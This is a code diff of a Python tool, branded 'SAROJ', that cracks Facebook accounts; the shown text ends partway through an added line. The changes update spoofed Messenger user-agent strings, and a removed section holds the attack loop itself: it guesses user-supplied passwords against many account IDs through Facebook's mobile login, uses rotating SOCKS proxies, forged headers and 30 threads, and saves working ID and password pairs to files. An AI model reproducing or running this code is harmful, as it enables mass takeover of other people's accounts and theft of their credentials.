@@ -86,7 +86,7 @@ except: pass
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/Orca-Android;FBAV/66.0.0.3871;FBBV/206904349;FBDM/{density=2.0,width=720,height=1426};FBLC/es_AR;FBRV/534116557;FBCR/T-Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
+    END = '[FBAN/Orca-Android;FBAV/78.0.0.3184;FBBV/446409108;FBDM/{density=2.0,width=720,height=1426};FBLC/pt_BR;FBRV/544912115;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -129,7 +129,7 @@ db   8D 88   88 88 `88. `8b  d8' db. 88         \033[1;34m
 \033[1;35m TOOL'S    >    \033[1;31mPERSONAL
 \033[1;36m STATU'S   >    \033[1;32mACTIVE
 \033[1;35m×××××××××××××××××××××××××××××××××××××××××××××××    \033[1;35m
-\33[37;41m\t VERSION > V1.1 \33[0;m
+\33[37;41m\t VERSION > V1.2 \33[0;m
 \33[1;33m×××××××××××××××××××××××××××××××××××××××××××××××      \033[1;33m"""
 #××××××××××(CLEAR)××××××××××#
 def clear():
@@ -245,7 +245,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/66.0.0.3871;FBBV/206904349;FBDM/{density=2.0,width=720,height=1426};FBLC/es_AR;FBRV/534116557;FBCR/T-Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/78.0.0.3184;FBBV/446409108;FBDM/{density=2.0,width=720,height=1426};FBLC/pt_BR;FBRV/544912115;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -434,74 +434,4 @@ class main_crack():
                 proxs= {'http': 'socks4://'+nip}
                 getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                 idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
-                head = {'Host': 'mbasic.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'pragma': 'no-cache', 'priority': 'u=1', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; 12; Redmi Note 10 ProW494P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4612.118 Chrome/107.0.0.0 Mobile Safari/537.36'}
-                head2 = {'Host': 'touch.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'pragma': 'no-cache', 'priority': 'u=1', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.2; LG-H522 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.86 Mobile Safari/537.36[FBAN/EMA;FBLC/en-US;FBAV/330.0.0.10.108;]'}
-                sex = ( head, head2 )
-                headers=random.choice(sex)
-                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=headers,proxies=proxs)
-                if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [SAROJ-OK] {sid} | {ps} {S}")
-                    
-                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
-                    oks.append(sid)
-                    open('/sdcard/SAROJ_OK.txt','a').write(sid+'|'+ps+'\n')
-                    break
-                elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SAROJ-CP] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/SAROJ_CP.txt','a').write(sid+'|'+ps+'\n')
-                    break
-                else:
-                    continue
-                #time.sleep(31)
-            
-            loop+=1
-        except requests.exceptions.ConnectionError:
-             self.methodD(sid, name, ps)
-            
-    def pasw(self):       
-            pw = []
-            clear()
-            print('\033[96;1mPUT LIMIT BETWEEN 1 TO 30\033[96;1m')
-            sl = int(input('\033[95;1mHOW MANY PASSWORD DO YOU WANT TO ADD ? :\033[95;1m '))
-            os.system("clear")
-            print(logo)
-            print(f'{S} (Example : first123,last1122,firstlast,last,etc)')
-            print('')
-            if sl =='':
-                print('\n PUT LIMIT BETWEEN 1 TO 30')
-            elif sl > 20:
-                print('\nPASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
-            else:
-                for sr in range(sl):
-                    pw.append(input(f' PASSWORD ({sr+1}) : '))
-            os.system("clear")
-            print(logo)
-            
-            print(f"\r{S} \033[1;33mUSED \033[1;33mFLIGHT \033[1;35mMODE \033[1;36mFOR \033[1;37mBETTER\033[1;36m RESULT'S\033[1;35m {S}")
-            print(47*"\033[0;37m×\033[0;37m")
-            print(f'{S}\033[1;33m TOTAL\033[1;34m IDs : %s ' % len(self.id))
-            print(f'{S} \033[1;35mCRACKING \033[1;36mSTARTED...')
-            print(47*"\033[1;37m×\033[1;37m")
-            with SAROJgod(max_workers=30) as SAROJworld:
-                for zsb in self.id:
-                   try:
-                       uid, name = zsb.split('|')
-                       sz = name.split(' ')
-                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
-                           pwx =  pw
-                       else:
-                            pwx =  pw
-                            if 'methodA' in methods:
-                                SAROJworld.submit(self.methodA, uid, name, pwx)
-                            elif 'methodB' in methods:
-                                SAROJworld.submit(self.methodB, uid, name, pwx)
-                            elif 'methodC' in methods:
-                                SAROJworld.submit(self.methodC, uid, name, pwx)
-                            elif 'methodD' in methods:
-                                SAROJworld.submit(self.methodD, uid, name, pwx)
-                   except:pass
-            result(oks,cps)
-
-			
-SAROJ()
+                head = {'Host': 'mbasic.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://mbasic.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'pragma': 'no-cache', 'priority': 'u=1', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; 12; Redmi Note 10 ProW494P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4612.118 Chrome/107.0.0.0 Mobile Sa
